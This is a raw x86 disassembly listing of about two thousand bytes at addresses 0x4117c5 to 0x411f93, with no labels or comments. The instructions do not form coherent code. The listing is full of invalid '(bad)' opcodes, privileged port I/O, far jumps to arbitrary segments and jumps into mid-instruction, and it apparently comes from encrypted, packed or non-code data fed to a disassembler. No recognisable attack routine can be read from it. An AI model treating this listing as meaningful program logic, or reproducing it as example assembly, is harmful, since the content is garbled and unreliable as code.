  4117c5:	stos   DWORD PTR es:[edi],eax
  4117c6:	and    eax,0x184397ab
  4117cb:	dec    edx
  4117cc:	aam    0xde
  4117ce:	sub    al,0xe0
  4117d0:	call   0x90b4b189
  4117d5:	push   0xa444181b
  4117da:	jl     0x41178a
  4117dc:	mov    al,ds:0xc1d864d4
  4117e1:	xor    eax,0x53e119c9
  4117e6:	cwde   
  4117e7:	sub    DWORD PTR ds:0xc1b0432e,ebp
  4117ed:	retf   
  4117ee:	push   edi
  4117ef:	clc    
  4117f0:	xor    al,0xb2
  4117f2:	pusha  
  4117f3:	jae    0x4117bf
  4117f5:	mov    al,ds:0xb065ebb9
  4117fa:	push   eax
  4117fb:	mov    ah,BYTE PTR [eax+0x49]
  4117fe:	add    al,0x97
  411800:	pop    ecx
  411801:	test   al,0xec
  411803:	fldcw  WORD PTR [ebx+0x3b513df6]
  411809:	nop
  41180a:	in     al,dx
  41180b:	mov    ch,0x20
  41180d:	xchg   ebx,eax
  41180e:	ret    
  41180f:	int    0xdf
  411811:	adc    ch,BYTE PTR [eax]
  411813:	enter  0xe592,0x70
  411817:	sbb    ah,BYTE PTR [ebx-0x1e]
  41181a:	sbb    al,0xe2
  41181c:	dec    eax
  41181d:	mov    cl,0x88
  41181f:	mov    al,ds:0xfc0532b7
  411824:	ins    BYTE PTR es:[edi],dx
  411825:	fs dec esp
  411827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411828:	retf   
  411829:	aaa    
  41182a:	inc    edx
  41182b:	test   eax,0x433f75fc
  411830:	ins    DWORD PTR es:[edi],dx
  411831:	js     0x4117e6
  411833:	fwait
  411834:	ret    0xfcb9
  411837:	(bad)
  41183a:	inc    ebx
  41183b:	repnz mov sp,0xf3
  411840:	stc    
  411841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411842:	cmp    DWORD PTR [esi+0x1d],esi
  411845:	pushf  
  411846:	cmp    esi,eax
  411848:	lock inc esi
  41184a:	jnp    0x4118ad
  41184c:	lock mov ebp,ebx
  41184f:	adc    eax,0x87514188
  411854:	inc    edx
  411855:	jmp    0x4117f7
  411857:	in     al,0xb6
  411859:	mov    bl,0xf5
  41185b:	pusha  
  41185c:	ret    0x4be
  41185f:	mov    esp,0xf267cc3
  411864:	xchg   BYTE PTR [ebx],dh
  411866:	mov    eax,esp
  411868:	jge    0x4117ff
  41186a:	jns    0x411802
  41186c:	arpl   cx,bp
  41186e:	dec    edx
  41186f:	sbb    BYTE PTR [edi],ah
  411871:	not    DWORD PTR ds:0x52d47436
  411877:	cmp    esp,ebx
  411879:	or     DWORD PTR ds:0xaced5c8f,ebp
  41187f:	scas   eax,DWORD PTR es:[edi]
  411880:	call   0x968:0x6a1ef476
  411887:	jmp    0x77da88fe
  41188c:	xchg   edi,eax
  41188d:	jae    0x41185b
  41188f:	or     ecx,DWORD PTR [ecx]
  411891:	push   ss
  411892:	xor    al,0xed
  411894:	test   al,0xc
  411896:	cmp    eax,0xca9d11c9
  41189b:	ss ret 0x2673
  41189f:	mov    edi,0x49a08fff
  4118a4:	xchg   ebp,eax
  4118a5:	loop   0x411906
  4118a7:	scas   eax,DWORD PTR es:[edi]
  4118a8:	fs repz mov esi,0x99a02e93
  4118af:	cs aaa 
  4118b1:	inc    ebx
  4118b2:	mov    edx,0x3291c493
  4118b7:	pop    ebp
  4118b8:	rcl    cl,0x55
  4118bb:	adc    eax,0xfb129d1d
  4118c0:	stos   BYTE PTR es:[edi],al
  4118c1:	ins    DWORD PTR es:[edi],dx
  4118c2:	out    dx,al
  4118c3:	std    
  4118c4:	lds    ecx,FWORD PTR [eax+0xc29e2e0]
  4118ca:	jl     0x411936
  4118cc:	and    edx,DWORD PTR [esi-0x47c4e283]
  4118d2:	mov    bh,0x82
  4118d4:	cli    
  4118d5:	pop    ebx
  4118d6:	push   edx
  4118d7:	push   cs
  4118d8:	and    eax,0xc884a917
  4118dd:	ins    BYTE PTR es:[edi],dx
  4118de:	aaa    
  4118df:	addr16 out 0xaf,eax
  4118e2:	jle    0x411946
  4118e4:	and    edx,eax
  4118e6:	xor    cl,BYTE PTR [esi+0x334a0d87]
  4118ec:	dec    edx
  4118ed:	and    al,0xc8
  4118ef:	scas   eax,DWORD PTR es:[edi]
  4118f0:	or     ebp,DWORD PTR [edi-0x4cceb7e2]
  4118f6:	fadd   QWORD PTR [edx+0x36410f53]
  4118fc:	pushf  
  4118fd:	pushf  
  4118fe:	ja     0x411936
  411900:	imul   ecx,DWORD PTR [esi+0x24],0x58c831c3
  411907:	fistp  QWORD PTR [esi+0x395a7c5e]
  41190d:	jp     0x411920
  41190f:	push   edx
  411910:	stos   DWORD PTR es:[edi],eax
  411911:	dec    esp
  411912:	jp     0x41195e
  411914:	retf   0x72b5
  411917:	mov    edx,0x2c88af46
  41191c:	sbb    al,0x44
  41191e:	mov    eax,0x557a9f33
  411923:	call   0x57a8eec2
  411928:	push   ss
  411929:	out    0x92,al
  41192b:	mov    eax,ds:0x3e6f7171
  411930:	aas    
  411931:	stos   DWORD PTR es:[edi],eax
  411932:	mov    eax,0x581bb81b
  411937:	(bad)  
  411938:	xchg   edx,eax
  411939:	outs   dx,BYTE PTR ds:[esi]
  41193a:	shl    BYTE PTR [ecx],0x59
  41193d:	jecxz  0x411955
  41193f:	pop    ecx
  411940:	push   esp
  411941:	aam    0x54
  411943:	sub    BYTE PTR [eax-0x42],dl
  411946:	test   eax,0x78856446
  41194b:	sub    ebp,DWORD PTR [edx-0x16]
  41194e:	mov    ah,0x16
  411950:	xor    ah,BYTE PTR [edi+0x35134428]
  411956:	pushf  
  411957:	xchg   ebp,eax
  411958:	loop   0x4118de
  41195a:	or     al,0x89
  41195c:	lods   al,BYTE PTR ds:[esi]
  41195d:	lahf   
  41195e:	es fwait
  411960:	push   edi
  411961:	jno    0x411987
  411963:	inc    edx
  411964:	call   DWORD PTR [ecx]
  411966:	push   edx
  411967:	ins    DWORD PTR es:[edi],dx
  411968:	test   eax,0x80c5a2c3
  41196d:	xor    al,0xff
  41196f:	scas   eax,DWORD PTR es:[edi]
  411970:	inc    ebp
  411971:	rcl    DWORD PTR [eax-0x6e941457],cl
  411977:	mov    cl,0xa9
  411979:	push   ebx
  41197a:	pop    esi
  41197b:	rol    DWORD PTR [esi],cl
  41197d:	aad    0x1e
  41197f:	or     DWORD PTR [edi],ebx
  411981:	dec    ebp
  411982:	sbb    BYTE PTR [ebx+edi*8-0x16],cl
  411986:	popf   
  411987:	fist   WORD PTR [eax-0x14]
  41198a:	ror    DWORD PTR [edx],0x3f
  41198d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41198e:	adc    DWORD PTR [eax],ebp
  411990:	cmp    dl,bl
  411992:	(bad)  
  411993:	ins    DWORD PTR es:[edi],dx
  411994:	mov    DWORD PTR [ecx+esi*4+0x2e89a6ff],0xeb396151
  41199f:	retf   0x5b4
  4119a2:	inc    edi
  4119a4:	mov    dl,0x7
  4119a6:	sbb    bl,BYTE PTR [ecx]
  4119a8:	add    DWORD PTR [ecx+0x17f8aedc],ebp
  4119ae:	push   cs
  4119af:	jns    0x41194f
  4119b1:	pop    ebp
  4119b2:	dec    edx
  4119b3:	or     eax,0x42c8058a
  4119b8:	mov    WORD PTR [edi],?
  4119ba:	add    al,dh
  4119bc:	sub    ebp,DWORD PTR [ecx+ebp*2]
  4119bf:	cmp    eax,0xaca74b53
  4119c4:	adc    eax,0xee5f1e4e
  4119c9:	lahf   
  4119ca:	push   ebp
  4119cb:	sub    al,0x70
  4119cd:	mov    eax,0x8cb7e1c6
  4119d2:	dec    edi
  4119d3:	mov    edx,0x7acf8eaa
  4119d8:	int3   
  4119d9:	add    ch,al
  4119db:	mov    eax,0x6cfbde76
  4119e0:	push   ecx
  4119e1:	mov    esi,DWORD PTR [esi-0x20]
  4119e4:	lods   al,BYTE PTR ds:[esi]
  4119e5:	sbb    DWORD PTR [edi+0x2917f70f],edx
  4119eb:	jl     0x4119d1
  4119ed:	mov    ds:0x2e89c696,al
  4119f2:	cdq    
  4119f3:	or     eax,0x28d23f85
  4119f8:	mov    dl,BYTE PTR [ebx+0x30]
  4119fb:	or     eax,0xa501b2fd
  411a00:	xor    eax,0x7314ed66
  411a05:	je     0x411a43
  411a07:	loope  0x4119b9
  411a09:	out    0x56,eax
  411a0b:	sbb    DWORD PTR [ebx-0x1f10e240],0x98783a0
  411a15:	cmc    
  411a16:	jns    0x411a29
  411a18:	das    
  411a19:	push   eax
  411a1a:	xchg   edi,eax
  411a1b:	sbb    bh,BYTE PTR [ebx]
  411a1d:	inc    edx
  411a1e:	lods   eax,DWORD PTR ds:[esi]
  411a1f:	mov    BYTE PTR [eax-0x7991c4f9],ch
  411a25:	mov    eax,ds:0xbad263f9
  411a2a:	call   DWORD PTR [edx+0x3a]
  411a2d:	sub    eax,0x57c16904
  411a32:	cli    
  411a33:	push   0xb6810fab
  411a38:	int3   
  411a39:	les    edi,FWORD PTR [eax-0x20]
  411a3c:	xchg   edi,eax
  411a3d:	cmp    ebp,DWORD PTR [edi-0xef9568f]
  411a43:	xlat   BYTE PTR ds:[ebx]
  411a44:	add    DWORD PTR [edx-0x35bf4554],ebx
  411a4a:	push   esi
  411a4b:	dec    ebp
  411a4c:	les    edi,FWORD PTR [eax+0x2d]
  411a4f:	data16 das 
  411a51:	fist   DWORD PTR [ecx]
  411a53:	mov    cl,0xe4
  411a55:	adc    ebp,DWORD PTR [ebx+0x4b]
  411a58:	adc    BYTE PTR [esp+ecx*1+0x6e],bh
  411a5c:	test   al,0xeb
  411a5e:	add    BYTE PTR [eax+eax*8+0x74],bh
  411a62:	outs   dx,DWORD PTR ds:[esi]
  411a63:	and    DWORD PTR [eax+0x32d5ac9d],0x591e5bf5
  411a6d:	dec    edi
  411a6e:	loopne 0x411a7e
  411a70:	pop    ebp
  411a71:	aaa    
  411a72:	xor    DWORD PTR ds:[edi-0x5b36cf74],esi
  411a79:	retf   0x161d
  411a7c:	out    0x12,eax
  411a7e:	sbb    ebp,eax
  411a80:	mov    DWORD PTR [eax],ebp
  411a82:	fld    DWORD PTR [esi-0x2f]
  411a85:	ins    DWORD PTR es:[edi],dx
  411a86:	xchg   edi,esi
  411a88:	add    esi,esi
  411a8a:	shl    BYTE PTR [eax-0x5e48f657],cl
  411a90:	jns    0x411a53
  411a92:	scas   eax,DWORD PTR es:[edi]
  411a93:	popf   
  411a94:	shr    DWORD PTR [eax-0x20],cl
  411a97:	inc    ecx
  411a98:	mov    ch,0xb0
  411a9a:	xrelease xchg DWORD PTR [edx-0x75],ebx
  411a9e:	ror    DWORD PTR [esi],cl
  411aa0:	add    cl,0x6f
  411aa3:	xor    eax,0x495f41e5
  411aa8:	cli    
  411aa9:	stc    
  411aaa:	xchg   BYTE PTR [ecx],dl
  411aac:	xlat   BYTE PTR ds:[ebx]
  411aad:	push   cs
  411aae:	ret    0xdc7
  411ab1:	sub    eax,0x32488b0c
  411ab6:	sbb    BYTE PTR [edx+0x73],bh
  411ab9:	cmp    ch,ah
  411abb:	mov    ebp,0x2b37a1ca
  411ac0:	js     0x411a66
  411ac2:	xor    ebp,DWORD PTR ds:0x73a95f8a
  411ac8:	dec    edx
  411ac9:	test   eax,0x91bf9d1d
  411ace:	loop   0x411b0d
  411ad0:	ror    DWORD PTR [esp+eiz*4-0xef07ac4],1
  411ad7:	shr    DWORD PTR [edx+0x64],cl
  411ada:	repnz push ebp
  411adc:	xor    DWORD PTR [edx+0x36e81ba1],ebx
  411ae2:	cmc    
  411ae3:	imul   ebx,DWORD PTR [edi],0x59aa4281
  411ae9:	xchg   ecx,eax
  411aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aeb:	pushf  
  411aec:	adc    ah,BYTE PTR [ebp-0x40]
  411aef:	jnp    0x411a91
  411af1:	mov    ah,0x6a
  411af3:	cmp    eax,0x1c022ce2
  411af8:	mov    esi,0xe67e0367
  411afd:	loopne 0x411ae4
  411aff:	ror    DWORD PTR [edx-0x6729193a],1
  411b05:	pop    eax
  411b06:	ret    
  411b07:	inc    eax
  411b08:	add    dh,BYTE PTR [eax-0x39f00ee2]
  411b0e:	(bad)  
  411b0f:	shl    BYTE PTR [edx-0x782fa14c],1
  411b15:	div    DWORD PTR [ecx]
  411b17:	dec    edi
  411b18:	icebp  
  411b19:	dec    ecx
  411b1a:	ret    
  411b1b:	inc    ebx
  411b1c:	retf   0xd8df
  411b1f:	jmp    0x411ab7
  411b21:	adc    eax,0x43b9f4a2
  411b26:	arpl   WORD PTR [edi],sp
  411b28:	ret    0x9590
  411b2b:	in     al,0xa9
  411b2d:	cmp    esi,DWORD PTR [ebx]
  411b2f:	cmp    dl,BYTE PTR [ebp-0x1e231c13]
  411b35:	in     al,0x46
  411b37:	cmp    eax,0x8fd45123
  411b3c:	jle    0x411b80
  411b3e:	fnstsw WORD PTR [esi+eiz*1-0x6fdbe9ee]
  411b45:	jecxz  0x411af9
  411b47:	loope  0x411b6c
  411b49:	aad    0x61
  411b4b:	jl     0x411b49
  411b4d:	vprolvd xmm1{k7},xmm1,DWORD PTR [ebx]{1to4}
  411b53:	pop    edx
  411b54:	pop    eax
  411b55:	adc    DWORD PTR [esi-0x16],ebp
  411b58:	jb     0x411b10
  411b5a:	mov    cl,BYTE PTR [edi+0x39]
  411b5d:	xchg   edi,eax
  411b5e:	mov    ds:0xaaa3890b,al
  411b63:	sbb    BYTE PTR [ebx],0x21
  411b66:	jns    0x411bb1
  411b68:	xor    al,0xb7
  411b6a:	sbb    al,0x27
  411b6c:	aam    0xc9
  411b6e:	push   ecx
  411b6f:	fisub  DWORD PTR ds:0x3801f38c
  411b75:	sbb    DWORD PTR [ecx+0x3919b98f],ebp
  411b7b:	out    dx,al
  411b7c:	dec    ecx
  411b7d:	imul   esi,DWORD PTR [eax],0x50d41006
  411b83:	inc    eax
  411b84:	enter  0x8cb,0xae
  411b88:	pop    ss
  411b89:	in     eax,0xe5
  411b8b:	hlt    
  411b8c:	std    
  411b8d:	in     al,dx
  411b8e:	sub    DWORD PTR [ebx],eax
  411b90:	xchg   esp,eax
  411b91:	rcl    DWORD PTR [edi-0x3f],0xba
  411b95:	sub    al,0x7c
  411b97:	arpl   WORD PTR [esi+eiz*2],si
  411b9a:	imul   ebp,DWORD PTR [esi-0x2e6cc3bb],0x16
  411ba1:	push   ds
  411ba2:	sub    DWORD PTR [edx],esi
  411ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba6:	mov    bl,0xec
  411ba8:	pop    esp
  411ba9:	call   0xf19f:0x8a3080d7
  411bb0:	jl     0x411c28
  411bb2:	sub    al,0x4f
  411bb4:	cmp    BYTE PTR [edi-0x2467f6c1],bl
  411bba:	cmp    eax,DWORD PTR [ebp+0x6c0af089]
  411bc0:	push   ecx
  411bc1:	sti    
  411bc2:	xor    BYTE PTR [ebx-0x1f],bl
  411bc5:	adc    DWORD PTR [ebx+0x45],esp
  411bc8:	test   eax,0xc15eb248
  411bcd:	adc    eax,DWORD PTR [edx+edx*1+0x6]
  411bd1:	dec    ebp
  411bd2:	call   0x23a3:0xeb38a7c3
  411bd9:	inc    ebp
  411bda:	ret    
  411bdb:	inc    esi
  411bdc:	inc    ebp
  411bdd:	aaa    
  411bde:	sub    eax,eax
  411be0:	push   edi
  411be1:	xor    BYTE PTR [esi],bl
  411be3:	cmp    cl,BYTE PTR [ebp+esi*4+0x2d858ab]
  411bea:	nop
  411beb:	sbb    al,0x24
  411bed:	jmp    0x411c42
  411bef:	ror    BYTE PTR [edi],1
  411bf1:	dec    edi
  411bf2:	adc    DWORD PTR [edx],ebp
  411bf4:	xchg   esi,eax
  411bf5:	and    eax,0xfba8ca00
  411bfa:	adc    BYTE PTR [eax+0x7a0f3923],bh
  411c00:	arpl   WORD PTR [ecx-0x58],ax
  411c03:	push   edi
  411c04:	pushf  
  411c05:	(bad)  
  411c06:	xchg   esi,eax
  411c07:	add    eax,0x3d48c1f8
  411c0c:	jg     0x411c11
  411c0e:	ins    BYTE PTR es:[edi],dx
  411c0f:	fsubr  QWORD PTR [ebx-0x22]
  411c12:	aam    0xe3
  411c14:	jg     0x411ba4
  411c16:	sbb    eax,0x2ffd22f1
  411c1b:	inc    esp
  411c1c:	adc    bl,BYTE PTR [ebp+0x275050af]
  411c22:	inc    cx
  411c25:	mov    dl,BYTE PTR [eax+0x6fc92925]
  411c2b:	inc    ebp
  411c2c:	in     eax,0xd4
  411c2e:	arpl   WORD PTR [ebx+eiz*2],cx
  411c31:	jg     0x411c98
  411c33:	fucomp st(5)
  411c35:	(bad)  
  411c36:	and    al,0xc9
  411c38:	push   cs
  411c39:	mov    eax,ebp
  411c3b:	outs   dx,DWORD PTR ds:[esi]
  411c3c:	sub    al,0x64
  411c3e:	and    eax,0xda7fec49
  411c43:	push   edx
  411c44:	dec    ecx
  411c45:	push   edi
  411c46:	mov    esi,0xd58f5b25
  411c4b:	fistp  WORD PTR [ebx+edx*2-0x5f]
  411c4f:	xchg   DWORD PTR [esp+ecx*4+0x79ecb79c],edi
  411c56:	test   BYTE PTR [ecx],0x7e
  411c59:	push   es
  411c5a:	or     DWORD PTR [esi+ebx*4],0x44
  411c5e:	js     0x411c45
  411c60:	ficomp WORD PTR [ecx+0x72]
  411c63:	push   cs
  411c64:	inc    ecx
  411c65:	pop    esp
  411c66:	int    0x6
  411c68:	ja     0x411cc3
  411c6a:	cmp    al,0xa3
  411c6c:	pop    ss
  411c6d:	pop    esi
  411c6e:	mov    ecx,ebp
  411c70:	nop
  411c71:	imul   esp,DWORD PTR [ecx],0xffffffdc
  411c74:	sbb    eax,DWORD PTR [edi+0x70a7d7ad]
  411c7a:	mov    ebp,0xbee90aaa
  411c7f:	bound  edx,QWORD PTR [ebx-0x4dd05216]
  411c85:	(bad)  
  411c86:	xchg   edx,eax
  411c87:	(bad)  
  411c88:	dec    ebp
  411c89:	repz inc edi
  411c8b:	pushf  
  411c8c:	adc    BYTE PTR [ecx+edi*4+0x215c2691],bl
  411c93:	jmp    0xc0dfabdf
  411c98:	cld    
  411c99:	cmp    al,0x8a
  411c9b:	outs   dx,BYTE PTR ds:[esi]
  411c9c:	pop    eax
  411c9d:	pushf  
  411c9e:	scas   eax,DWORD PTR es:[edi]
  411c9f:	push   ecx
  411ca0:	ret    0xa269
  411ca3:	jmp    0x411d0f
  411ca5:	gs aas 
  411ca7:	or     DWORD PTR [edi-0x55b0f45e],eax
  411cad:	sub    DWORD PTR [ebp-0x63a9a5d1],0x4f
  411cb4:	or     eax,0x2d3e9801
  411cb9:	ficom  WORD PTR [esi]
  411cbb:	xlat   BYTE PTR ds:[ebx]
  411cbc:	add    edx,edx
  411cbe:	or     eax,0xf7e97a1d
  411cc3:	fdivp  st(6),st
  411cc5:	cmp    DWORD PTR [ebp-0x7e3119bb],eax
  411ccb:	add    eax,0x23ff440f
  411cd0:	xchg   ebx,eax
  411cd1:	and    BYTE PTR [eax],0xdc
  411cd4:	and    dl,BYTE PTR [ebp+0x27]
  411cd7:	xor    BYTE PTR ds:0x6a06a4bf,ch
  411cdd:	mov    ebp,0x62b27fc5
  411ce2:	mov    ah,0xe3
  411ce4:	mov    ecx,0x1e3a815f
  411ce9:	cmp    eax,0x409fd2f0
  411cee:	shl    DWORD PTR [edx-0x1e99b66d],0xaa
  411cf5:	repnz scas eax,DWORD PTR es:[edi]
  411cf7:	jno    0x411ce3
  411cf9:	sub    esi,edi
  411cfb:	or     al,0x3d
  411cfd:	push   cs
  411cfe:	pusha  
  411cff:	inc    eax
  411d00:	jle    0x411cc1
  411d02:	cmp    DWORD PTR [edx+esi*1],edi
  411d05:	add    DWORD PTR [edi+0x5c],0xed8cb8fd
  411d0c:	fiadd  WORD PTR [esi]
  411d0e:	xchg   esp,eax
  411d0f:	call   0x35f1c47c
  411d14:	jmp    0x411d0e
  411d16:	jne    0x411d59
  411d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d19:	add    al,0xd1
  411d1b:	push   esi
  411d1c:	aaa    
  411d1d:	pop    edx
  411d1e:	out    dx,al
  411d1f:	add    al,0x59
  411d21:	arpl   WORD PTR [eax+ebp*1-0x2c],sp
  411d25:	sbb    DWORD PTR [esi+edi*8+0x42],edi
  411d29:	sub    DWORD PTR [edx],ebx
  411d2b:	add    bh,bh
  411d2d:	pop    eax
  411d2e:	or     eax,0xadcf6d44
  411d33:	cmp    eax,0xfe20b439
  411d38:	lds    esp,FWORD PTR [eax]
  411d3a:	call   0xe5bdb875
  411d3f:	sub    BYTE PTR [ecx],0xdb
  411d42:	cli    
  411d43:	bound  esp,QWORD PTR ds:0xd8821f09
  411d49:	fdivr  DWORD PTR [ebp-0x5aa8006]
  411d4f:	aad    0xcd
  411d51:	and    al,0x2b
  411d53:	mov    edi,DWORD PTR [edx-0x9968b0e]
  411d59:	test   al,0xa6
  411d5b:	call   0x66c1:0x487ef7e1
  411d62:	push   esi
  411d63:	add    eax,0x37b83671
  411d68:	in     al,0x68
  411d6a:	lahf   
  411d6b:	out    dx,al
  411d6c:	in     eax,0xd5
  411d6e:	aam    0xbf
  411d70:	inc    ebx
  411d71:	test   al,0xb2
  411d73:	jge    0x411d44
  411d75:	aaa    
  411d76:	pop    ds
  411d77:	push   0x56
  411d79:	aam    0x48
  411d7b:	js     0x411d8c
  411d7d:	imul   edx,DWORD PTR [ebx],0x8d9725
  411d83:	sub    DWORD PTR [edi-0x38],edx
  411d86:	es push edi
  411d88:	or     al,ah
  411d8a:	mov    DWORD PTR [ebx*8-0x4531ee77],esp
  411d91:	je     0x411d9b
  411d93:	xor    edx,edx
  411d95:	push   esi
  411d96:	sub    eax,0x8a27a037
  411d9b:	sar    BYTE PTR [ebx-0x10],cl
  411d9e:	mov    dl,0x1d
  411da0:	xchg   ebx,eax
  411da1:	rcr    DWORD PTR ds:0x84dd5aa7,cl
  411da7:	sub    al,0x61
  411da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411daa:	add    BYTE PTR [esi-0x50],dh
  411dad:	stos   BYTE PTR es:[edi],al
  411dae:	aam    0x84
  411db0:	adc    al,0xd9
  411db2:	and    ch,0x17
  411db5:	mov    ebx,0xcd5164b
  411dba:	inc    ebx
  411dbb:	mov    al,ds:0xfb273e7b
  411dc0:	push   cs
  411dc1:	mov    ah,0x67
  411dc3:	shl    DWORD PTR [ecx],1
  411dc5:	pop    edi
  411dc6:	push   ebp
  411dc7:	bound  eax,QWORD PTR [eax+0x6c5f9f1a]
  411dcd:	outs   dx,DWORD PTR ds:[esi]
  411dce:	inc    eax
  411dcf:	ret    
  411dd0:	dec    ecx
  411dd1:	add    ch,BYTE PTR [ebp+0x58]
  411dd4:	mov    ecx,0x939f20e
  411dd9:	je     0x411e14
  411ddb:	leave  
  411ddc:	jge    0x411de2
  411dde:	push   es
  411ddf:	aam    0xe
  411de1:	ja     0x411e04
  411de3:	push   ebx
  411de4:	aaa    
  411de5:	fwait
  411de6:	shr    BYTE PTR [edx-0x1f],0x66
  411dea:	sbb    BYTE PTR [ebx+0x315e853e],ch
  411df0:	data16 sbb al,0x8
  411df3:	retf   0xcb7e
  411df6:	jno    0x411e11
  411df8:	adc    ebp,DWORD PTR [edi+0x2b]
  411dfb:	or     dh,cl
  411dfd:	dec    esi
  411dfe:	outs   dx,DWORD PTR ds:[esi]
  411dff:	mov    ds,WORD PTR [edx]
  411e01:	enter  0x6c2c,0xd1
  411e05:	(bad)  
  411e06:	jo     0x411db2
  411e08:	or     bh,0x99
  411e0b:	dec    ebx
  411e0c:	pop    es
  411e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e0e:	sbb    dl,BYTE PTR [ecx-0x7]
  411e11:	(bad)  
  411e12:	in     al,dx
  411e13:	and    DWORD PTR [esi-0x7d142cd5],edi
  411e19:	mov    bl,0x7e
  411e1b:	ss jb  0x411dc2
  411e1e:	retf   
  411e1f:	add    eax,0x37aaace3
  411e24:	nop
  411e25:	inc    eax
  411e26:	add    BYTE PTR [edx-0x5530f9b3],bl
  411e2c:	mov    BYTE PTR [esi-0x764d3808],bh
  411e32:	jp     0x411dcc
  411e34:	inc    eax
  411e35:	mov    cl,0x22
  411e37:	cwde   
  411e38:	xchg   ecx,eax
  411e39:	jl     0x411e9c
  411e3b:	pusha  
  411e3c:	scas   al,BYTE PTR es:[edi]
  411e3d:	add    eax,0x32e94f85
  411e42:	js     0x411ddf
  411e44:	shr    DWORD PTR [ebx+0x642d4874],0x68
  411e4b:	shr    al,0xc1
  411e4e:	mov    ebx,0x3d62f3a7
  411e53:	add    cl,BYTE PTR [eax-0x28]
  411e56:	das    
  411e57:	inc    esp
  411e58:	jb     0x411ece
  411e5a:	sub    BYTE PTR [eax+ebx*8-0x19a0e2b3],ah
  411e61:	push   ss
  411e62:	jno    0x411dee
  411e64:	jmp    0x85d6:0x3d33d9f7
  411e6b:	(bad)  
  411e6c:	and    bl,BYTE PTR [ebp+0xb09925e]
  411e72:	push   es
  411e73:	xchg   DWORD PTR [edx+0x6],ebx
  411e76:	jae    0x411e91
  411e78:	aad    0x7c
  411e7a:	cmp    al,0x3a
  411e7c:	mov    bh,0x83
  411e7e:	dec    esi
  411e7f:	in     al,dx
  411e80:	test   al,0x6d
  411e82:	push   ds
  411e83:	cmp    BYTE PTR [ecx],ah
  411e85:	aas    
  411e86:	jae    0x411eed
  411e88:	adc    dh,BYTE PTR [edx]
  411e8a:	xor    eax,0xae9f78a5
  411e8f:	(bad)  
  411e92:	out    dx,eax
  411e93:	dec    BYTE PTR [ecx+0x58]
  411e96:	mov    ah,0x5e
  411e98:	out    0x91,eax
  411e9a:	add    DWORD PTR [eax-0x10],ebx
  411e9d:	retf   
  411e9e:	(bad)  
  411e9f:	ins    DWORD PTR es:[edi],dx
  411ea0:	mov    bl,0xe8
  411ea2:	test   BYTE PTR [edi+0x1597f2c0],0xe3
  411ea9:	iret   
  411eaa:	push   ebx
  411eab:	dec    DWORD PTR [edi]
  411ead:	mov    esi,0x24fa4506
  411eb2:	xchg   esi,eax
  411eb3:	iret   
  411eb4:	lea    edx,[esi-0x51]
  411eb7:	leave  
  411eb8:	adc    ecx,DWORD PTR [esi]
  411eba:	xchg   esi,eax
  411ebb:	test   BYTE PTR [esi+eax*1-0x7f],cl
  411ebf:	adc    cl,BYTE PTR [edx+0x38]
  411ec2:	and    bh,BYTE PTR [ebp+0x6e37e09d]
  411ec8:	call   0x9007:0x673fcaf5
  411ecf:	dec    DWORD PTR [ecx-0x10]
  411ed2:	lods   eax,DWORD PTR ds:[esi]
  411ed3:	sbb    DWORD PTR [ecx],ebp
  411ed5:	aaa    
  411ed6:	das    
  411ed7:	inc    ebp
  411ed8:	mov    bl,0x9b
  411eda:	loopne 0x411ebc
  411edc:	aaa    
  411edd:	xchg   ebp,eax
  411ede:	push   ecx
  411edf:	xor    BYTE PTR ss:[ecx],bl
  411ee2:	fld    TBYTE PTR [ebx]
  411ee4:	dec    esi
  411ee5:	adc    al,0x6d
  411ee7:	xor    BYTE PTR [eax],cl
  411ee9:	mov    bh,0xbe
  411eeb:	dec    esp
  411eec:	pop    edx
  411eed:	inc    ecx
  411eee:	mov    edi,0x100f4a44
  411ef3:	add    BYTE PTR [ebp+0x15a5f4bb],dh
  411ef9:	push   ss
  411efa:	xor    ch,dh
  411efc:	sub    al,0x27
  411efe:	jmp    0xbec8:0x6f6a8f21
  411f05:	mov    WORD PTR [esi],cs
  411f07:	inc    ecx
  411f08:	fist   DWORD PTR [esi-0x18]
  411f0b:	dec    edx
  411f0c:	cmp    dh,BYTE PTR [esi]
  411f0e:	xor    al,0x16
  411f10:	pop    ebp
  411f11:	sub    BYTE PTR [ebx+0x2f],dl
  411f14:	sbb    BYTE PTR [edi-0x1c],ah
  411f17:	push   ds
  411f18:	mov    ecx,0xe41bfebc
  411f1d:	lahf   
  411f1e:	call   0x9653bb37
  411f23:	(bad)  
  411f24:	pop    ecx
  411f25:	jle    0x411f0d
  411f27:	mov    dl,0xa6
  411f29:	xchg   edi,eax
  411f2a:	sbb    edi,DWORD PTR [ebx+0x1a]
  411f2d:	add    cl,0x7e
  411f30:	dec    BYTE PTR [eax]
  411f32:	cwde   
  411f33:	adc    bh,BYTE PTR ds:0x5e55d09d
  411f39:	xchg   esp,eax
  411f3a:	jo     0x411edc
  411f3c:	cmp    al,0x9d
  411f3e:	pop    es
  411f3f:	call   0xe245:0xe6143938
  411f46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f47:	and    eax,0xb13e4e65
  411f4c:	sbb    DWORD PTR [eax],0x61463d9b
  411f52:	shl    edi,cl
  411f54:	sub    eax,DWORD PTR [ecx+0x37]
  411f57:	imul   esi,DWORD PTR [eax-0x77d4388f],0xe
  411f5e:	leave  
  411f5f:	ss popf 
  411f61:	xchg   ebx,eax
  411f62:	jnp    0x411fba
  411f64:	mov    ah,0x72
  411f66:	rcr    DWORD PTR ds:0x4cae21be,0x40
  411f6d:	dec    edx
  411f6e:	call   0xde2eb789
  411f73:	jae    0x411fbb
  411f75:	(bad)  [edi+0x70eb7eaf]
  411f7b:	mov    ah,0xe8
  411f7d:	std    
  411f7e:	les    ebx,FWORD PTR [esi+0x1a]
  411f81:	int3   
  411f82:	ja     0x411f26
  411f84:	loope  0x411f68
  411f86:	test   BYTE PTR [edx+esi*4-0x7d],ch
  411f8a:	loop   0x411fbe
  411f8c:	js     0x411f87
  411f8e:	xchg   ebp,eax
  411f8f:	outs   dx,DWORD PTR ds:[esi]
  411f90:	pusha  
  411f91:	jnp    0x411fe3
  411f93:	pop    edx
